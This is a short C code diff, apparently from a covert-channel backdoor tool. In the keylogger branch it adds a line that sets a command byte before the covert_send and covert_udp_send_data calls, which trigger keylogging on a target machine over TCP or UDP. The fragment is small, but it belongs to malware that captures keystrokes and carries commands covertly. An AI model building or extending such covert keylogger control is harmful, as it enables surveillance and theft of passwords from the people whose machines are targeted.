@@ -124,9 +124,11 @@ int main(int argc, char **argv){
 
     //KEYLOGGER
     } else if (if_keylogger == true && tcp == true) {
+        strncpy(data, "k", 1);
         covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
         covert_send(localip, targetip, UPORT, UPORT, data, EOT);
     } else if (if_keylogger == true && tcp == false) {
+        strncpy(data, "k", 1);
         covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER); //also sends EOT
 
     }
